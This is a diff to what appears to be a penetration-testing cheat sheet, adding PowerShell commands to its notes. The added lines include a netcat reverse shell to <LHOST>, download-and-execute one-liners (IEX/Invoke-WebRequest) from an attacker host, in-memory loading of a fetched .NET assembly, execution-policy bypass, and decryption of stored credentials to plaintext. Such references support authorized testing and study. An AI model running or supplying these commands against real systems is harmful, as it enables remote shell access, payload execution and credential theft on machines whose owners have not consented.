@@ -3844,10 +3844,28 @@ $ sudo apt-get install powershell
 PS C:\> Get-Help <COMMAND>
 ```
 
+#### Unzip a File
+
+```c
+PS C:\> Expand-Archive -Force <FILE>.zip
+```
+
 #### Search for Files
 
 ```c
 PS C:\> type <FILE> | findstr /l <STRING>
+```
+
+#### Start a new Process
+
+```c
+PS C:\> Start-Process -FilePath "C:\nc64.exe" -ArgumentList "<LHOST> <LPORT> -e powershell"
+```
+
+### Import Module to PowerShell cmdlet
+
+```c
+PS C:\> Import-Module .\<FILE>
 ```
 
 #### Check Execution Policy
@@ -3864,6 +3882,14 @@ PS C:\> Set-ExecutionPolicy unrestricted
 PS C:\> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
 ```
 
+### Check PowerShell Versions
+
+```c
+PS C:\> Set-ExecutionPolicy Unrestricted
+PS C:\> powershell -Command "$PSVersionTable.PSVersion"
+PS C:\> powershell -c "[Environment]::Is64BitProcess"
+```
+
 ### Script Execution Bypass
 
 ```c
@@ -3871,18 +3897,20 @@ PS C:\> powershell -ex bypass -File <FILE>.ps1
 PS C:\> powershell.exe -noprofile -executionpolicy bypass -file .\<FILE>.ps1
 ```
 
-### Import Module to PowerShell cmdlet
+### Invoke-Expression / Invoke-WebRequest
 
 ```c
-PS C:\> import-module ./<module / powershell script>
+PS C:\> IEX(IWR http://<LHOST>/<FILE>.ps1)
+PS C:\> Invoke-Expression (Invoke-WebRequest http://<LHOST/<FILE>.ps1)
 ```
 
-### Check PowerShell Versions
+### .NET Reflection
 
 ```c
-PS C:\> Set-ExecutionPolicy Unrestricted
-PS C:\> powershell -Command "$PSVersionTable.PSVersion"
-PS C:\> powershell -c "[Environment]::Is64BitProcess"
+PS C:\> $bytes = (Invoke-WebRequest "http://<LHOST>/<FILE>.exe" -UseBasicParsing ).Content
+PS C:\> $assembly = [System.Reflection.Assembly]::Load($bytes)
+PS C:\> $entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
+PS C:\> $entryPointMethod.Invoke($null, (, [string[]] ('find', '/<COMMAND>')))
 ```
 
 ### PSCredential
@@ -3895,8 +3923,8 @@ Export-CliXml
 ### Start offsec Session
 
 ```c
-PS /home/kali> $offsec_session = New-PSSession -ComputerName <RHOST> -Authentication Negotiate -Credential <USERNAME>
-PS /home/kali> Enter-PSSession $offsec_session
+PS /home/<USERNAME>> $offsec_session = New-PSSession -ComputerName <RHOST> -Authentication Negotiate -Credential <USERNAME>
+PS /home/<USERNAME>> Enter-PSSession $offsec_session
 ```
 
 ### Execute Command as another User
@@ -3920,6 +3948,15 @@ PS C:\> Start-Process powershell.exe -Credential $credential
 
 ```c
 PS C:\> powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
+```
+
+### Decryption
+
+```c
+PS C:\> $key = Get-Content ".\<FILE>"
+PS C:\> $pass = (Get-Content ".\<FILE>" | ConvertTo-SecureString -Key $key)
+PS C:\> $secret = (New-Object PSCredential 0, $pass).GetNetworkCredential().Password
+PS C:\> echo $secret
 ```
 
 ### Scheduled Tasks
